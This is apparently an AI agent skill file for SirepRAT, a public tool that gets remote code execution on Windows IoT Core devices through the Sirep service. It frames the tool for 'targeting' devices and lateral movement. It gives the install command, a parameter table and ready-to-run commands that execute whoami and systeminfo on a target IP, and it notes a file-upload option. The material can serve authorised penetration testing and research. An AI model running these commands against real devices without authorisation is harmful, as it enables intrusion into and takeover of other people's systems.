---
name: sireprat-windows-iot
description: "SirepRAT: Windows IoT device RCE. Signals: lateral movement, psexec, upload."
zh-signals: "SirepRAT: Windows IoT 设备 RCE。信号:横向移动,psexec,上传。"
when-to-use: >-
  Use when targeting Windows IoT devices that expose the Sirep service, to
  execute commands remotely or upload files for lateral movement.
---

# SirepRAT

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/SafeBreach-Labs/SirepRAT
- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/SafeBreach-Labs/SirepRAT && cd SirepRAT && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c whoami'` | Windows IoT RCE |
| `-c 'cmd /c dir'` | Command |
| `-f file` | Upload |

## Attack Scenario Playbook

### Windows IoT Device RCE

```bash
python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c systeminfo'
# RCE over the Sirep protocol
```

## Notes

By SafeBreach, an RCE against Windows IoT Core.
